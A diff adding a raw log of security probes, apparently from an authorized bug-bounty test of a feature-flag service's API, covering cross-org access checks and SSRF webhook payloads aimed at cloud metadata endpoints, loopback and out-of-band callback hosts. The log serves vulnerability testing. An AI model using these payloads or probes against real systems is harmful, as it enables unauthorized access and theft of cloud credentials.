@@ -1,0 +1,132 @@
+=== R11 HUNT2 — follow-ups ===
+
+--- F1: agent-control PATH-id vs TOKEN identity ---
+[NA GET TST_ACC agent-control]: 200 {"accountId":"6ac28fd11c28fb07516cf361","dailyTokenLimit":0,"enabled":false}
+
+[NA GET ORG_ACC agent-control (own)]: 200 {"accountId":"6ac28fd11c28fb07516cf361","dailyTokenLimit":0,"enabled":false}
+
+[M GET TST_ACC agent-control]: 200 {"accountId":"6ac28fd11c28fb07516cf361","dailyTokenLimit":0,"enabled":false}
+
+[NA PUT TST_ACC agent-control no-op]: 403 {"code":"forbidden","message":"Access to the requested resource was denied"}
+[NA PUT TST_ACC agent-control enabled=true]: 403 {"code":"forbidden","message":"Access to the requested resource was denied"}
+[TST verify after NA PUT]: 200 {"accountId":"6ac29057ccacd606b1576cb7","dailyTokenLimit":0,"enabled":false}
+
+
+--- F2: announcements cross-org (full id extraction) ---
+[ORG announcements list]: 200 len=408
+ann metas: [('ab1c4a7d-fb1d-4e90-a5cc-f48fa10c7e67', 'inactive', 'TESTS')]
+[TST GET ann/ab1c4a7d-fb1d-4e90-a5cc-f48fa10c7e67]: 405 
+[NA GET ann/ab1c4a7d-fb1d-4e90-a5cc-f48fa10c7e67]: 405 
+[UN GET ann/ab1c4a7d-fb1d-4e90-a5cc-f48fa10c7e67]: 405 
+[TST GET internal/ann/ab1c4a7d-fb1d-4e90-a5cc-f48fa10c7e67]: 405 
+
+--- F3: webhook detail cross-org (GET ONLY) ---
+  webhook meta: 6ada0e0ff68b4507c663d7d5 creator: None tags: ['bounty'] secret-prensent: False
+  webhook meta: 6ada601db9a33f075201c887 creator: None tags: ['bounty'] secret-prensent: False
+  webhook meta: 6ada6031de91770792196bf0 creator: None tags: ['bounty'] secret-prensent: False
+  webhook meta: 6ada8abf40a7b8072deeefa8 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8ac050300b07828f8ee2 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8ac28f049f07376083bf creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8ac38d015c070cdc3f42 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8ac4de917707921ac6bc creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8af57d401b07a4974fe9 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8af6176322076b994833 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8af750300b07828f8f45 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8af8022a1f07bba95106 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8afa65fd9b07cf897c44 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+  webhook meta: 6ada8afb13dfe507423b24c5 creator: None tags: ['zeno-ssrf'] secret-prensent: False
+[TST GET webhook/6ada0e0ff68b4507c663d7d5]: 404 
+[NA GET webhook/6ada0e0ff68b4507c663d7d5]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada0e0ff68b4507c663d7d5","type":"application/json"}},"_id":"6ada0e0ff68b4507c663d7d5","name":"zeno-ssrf-test","url":"https://webhook.site/4bd4bb0f-fb6f-4fe9-82bc-9146ebabb584","on":true,"tags":["bounty"]}
+[UN GET webhook/6ada0e0ff68b4507c663d7d5]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada0e0ff68b4507c663d7d5 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada601db9a33f075201c887]: 404 
+[NA GET webhook/6ada601db9a33f075201c887]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada601db9a33f075201c887","type":"application/json"}},"_id":"6ada601db9a33f075201c887","name":"zeno-oast-hook","url":"https://d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/ld-webhook-probe","on":true,"tags":["bounty"]}
+[UN GET webhook/6ada601db9a33f075201c887]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada601db9a33f075201c887 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada6031de91770792196bf0]: 404 
+[NA GET webhook/6ada6031de91770792196bf0]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada6031de91770792196bf0","type":"application/json"}},"_id":"6ada6031de91770792196bf0","name":"zeno-badhost-hook","url":"https://internal-probe-xyz.invalid-host-d9c558sobm9hlgrrkssg17bwia6p4dicf.oast.site/hook","on":true,"tags":["bounty"]}
+[UN GET webhook/6ada6031de91770792196bf0]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada6031de91770792196bf0 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8abf40a7b8072deeefa8]: 404 
+[NA GET webhook/6ada8abf40a7b8072deeefa8]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8abf40a7b8072deeefa8","type":"application/json"}},"_id":"6ada8abf40a7b8072deeefa8","name":"zeno-ssrf-W2-oast-direct","url":"https://0xfvy9xf0l070a369a4ln51he8uvdev0h.oast.me/wh-direct","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8abf40a7b8072deeefa8]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8abf40a7b8072deeefa8 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8ac050300b07828f8ee2]: 404 
+[NA GET webhook/6ada8ac050300b07828f8ee2]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8ac050300b07828f8ee2","type":"application/json"}},"_id":"6ada8ac050300b07828f8ee2","name":"zeno-ssrf-W3-private-ip","url":"http://169.254.169.254/latest/meta-data/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8ac050300b07828f8ee2]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8ac050300b07828f8ee2 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8ac28f049f07376083bf]: 404 
+[NA GET webhook/6ada8ac28f049f07376083bf]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8ac28f049f07376083bf","type":"application/json"}},"_id":"6ada8ac28f049f07376083bf","name":"zeno-ssrf-W4-webhooksite","url":"https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?src=ld-webhook","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8ac28f049f07376083bf]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8ac28f049f07376083bf detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8ac38d015c070cdc3f42]: 404 
+[NA GET webhook/6ada8ac38d015c070cdc3f42]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8ac38d015c070cdc3f42","type":"application/json"}},"_id":"6ada8ac38d015c070cdc3f42","name":"zeno-ssrf-W5-redirect-in","url":"https://httpbin.org/redirect-to?url=https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3?via=redirect\u0026status_code=302","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8ac38d015c070cdc3f42]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8ac38d015c070cdc3f42 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8ac4de917707921ac6bc]: 404 
+[NA GET webhook/6ada8ac4de917707921ac6bc]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8ac4de917707921ac6bc","type":"application/json"}},"_id":"6ada8ac4de917707921ac6bc","name":"zeno-ssrf-W5b-redirect-md","url":"https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F\u0026status_code=302","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8ac4de917707921ac6bc]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8ac4de917707921ac6bc detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8af57d401b07a4974fe9]: 404 
+[NA GET webhook/6ada8af57d401b07a4974fe9]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8af57d401b07a4974fe9","type":"application/json"}},"_id":"6ada8af57d401b07a4974fe9","name":"zeno-ssrf-W3c-localhost80","url":"http://localhost/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8af57d401b07a4974fe9]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8af57d401b07a4974fe9 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8af6176322076b994833]: 404 
+[NA GET webhook/6ada8af6176322076b994833]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8af6176322076b994833","type":"application/json"}},"_id":"6ada8af6176322076b994833","name":"zeno-ssrf-W3d-loopback","url":"http://127.0.0.1/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8af6176322076b994833]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8af6176322076b994833 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8af750300b07828f8f45]: 404 
+[NA GET webhook/6ada8af750300b07828f8f45]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8af750300b07828f8f45","type":"application/json"}},"_id":"6ada8af750300b07828f8f45","name":"zeno-ssrf-W3e-metadata-root","url":"http://169.254.169.254/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8af750300b07828f8f45]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8af750300b07828f8f45 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8af8022a1f07bba95106]: 404 
+[NA GET webhook/6ada8af8022a1f07bba95106]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8af8022a1f07bba95106","type":"application/json"}},"_id":"6ada8af8022a1f07bba95106","name":"zeno-ssrf-W3f-mdgoog","url":"http://metadata.goog/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8af8022a1f07bba95106]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8af8022a1f07bba95106 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8afa65fd9b07cf897c44]: 404 
+[NA GET webhook/6ada8afa65fd9b07cf897c44]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8afa65fd9b07cf897c44","type":"application/json"}},"_id":"6ada8afa65fd9b07cf897c44","name":"zeno-ssrf-W3g-mdginternal","url":"http://metadata.google.internal/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8afa65fd9b07cf897c44]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8afa65fd9b07cf897c44 detail]: 200 secret-field-present: False
+[TST GET webhook/6ada8afb13dfe507423b24c5]: 404 
+[NA GET webhook/6ada8afb13dfe507423b24c5]: 200 {"_links":{"parent":{"href":"/api/v2/webhooks","type":"application/json"},"self":{"href":"/api/v2/webhooks/6ada8afb13dfe507423b24c5","type":"application/json"}},"_id":"6ada8afb13dfe507423b24c5","name":"zeno-ssrf-W3h-v6metadata","url":"http://[fd00:ec2::254]/","on":true,"tags":["zeno-ssrf"]}
+[UN GET webhook/6ada8afb13dfe507423b24c5]: 401 {"code":"unauthorized","message":"Invalid account ID header"}
+[ORG GET own webhook/6ada8afb13dfe507423b24c5 detail]: 200 secret-field-present: False
+
+--- F4: relay-auto-config identity check + reset cross-org ---
+  relay meta: 6ac3b42d7c3e1a06f53cf211 creator: zeno0+org@bugcrowdninja.com created: None displayName: None keys: ['_id', '_creator', '_access', 'name', 'policy', 'displayKey', 'creationDate', 'lastModified']
+[TST POST relay reset]: 415 {"code":"invalid_request","message":"Content-Type must conform to 'application/json'"}
+[NA POST relay reset]: 415 {"code":"invalid_request","message":"Content-Type must conform to 'application/json'"}
+[UN POST relay reset]: 415 {"code":"invalid_request","message":"Content-Type must conform to 'application/json'"}
+[ORG verify relay intact]: 200 {"_id":"6ac3b42d7c3e1a06f53cf211","_creator":{"_links":{"self":{"href":"/api/v2/members/6ac28fd11c28fb07516cf363","type":"application/json"}},"_id":"6ac28fd11c28fb07516cf363","firstName":"zeno","lastName":"test","role":"owner","email":"zeno0+org@bugcrowdninja.com"},"_access":{"denied":[],"allowed":[]},"name":"zeno testss","policy":[{"resources":["proj/*:env/*"],"actions":["*"],"effect":"allow"}],"
+
+--- F5: access-check bulk with Authorization combos ---
+[M bulk {}]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[M bulk {"requests": []}]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[M bulk {"requests": [{"resourceId": "6ac28fd11c28fb07516cf363", "ac]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[M bulk {"items": [{"resource": "mem/6ac28fd11c28fb07516cf363", "act]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[M bulk {"checks": [{"action": "viewMember", "resource": "6ac28fd11c]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[NA bulk {}]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[NA bulk {"requests": []}]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[NA bulk {"requests": [{"resourceId": "6ac28fd11c28fb07516cf363", "ac]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[NA bulk {"items": [{"resource": "mem/6ac28fd11c28fb07516cf363", "act]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+[NA bulk {"checks": [{"action": "viewMember", "resource": "6ac28fd11c]: 400 {"code":"invalid_request","message":"/type got object, want array."}
+
+--- F6: adaptive-triggers query grammar ---
+[ORG GET api adaptive-triggers?resourceKind=flag]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKey' is missing."}
+[ORG GET internal adaptive-triggers?resourceKind=flag]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' is missing."}
+[ORG GET api adaptive-triggers?resourceKind=metric]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' does not match allowed values."}
+[ORG GET internal adaptive-triggers?resourceKind=metric]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' is missing."}
+[ORG GET api adaptive-triggers?resourceKind=segment]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' does not match allowed values."}
+[ORG GET internal adaptive-triggers?resourceKind=segment]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' is missing."}
+[ORG GET api adaptive-triggers?resourceKind=experiment]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' does not match allowed values."}
+[ORG GET internal adaptive-triggers?resourceKind=experiment]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' is missing."}
+[ORG GET api adaptive-triggers?sourceType=flag]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' is missing."}
+[ORG GET internal adaptive-triggers?sourceType=flag]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' does not match allowed values."}
+[ORG GET api adaptive-triggers?sourceType=metric]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' is missing."}
+[ORG GET internal adaptive-triggers?sourceType=metric]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' does not match allowed values."}
+[ORG GET api adaptive-triggers?sourceType=segment]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' is missing."}
+[ORG GET internal adaptive-triggers?sourceType=segment]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' does not match allowed values."}
+[ORG GET api adaptive-triggers?sourceType=trigger]: 400 {"code":"invalid_request","message":"Query parameter 'resourceKind' is missing."}
+[ORG GET internal adaptive-triggers?sourceType=trigger]: 400 {"code":"invalid_request","message":"Query parameter 'sourceType' does not match allowed values."}
+
+DONE
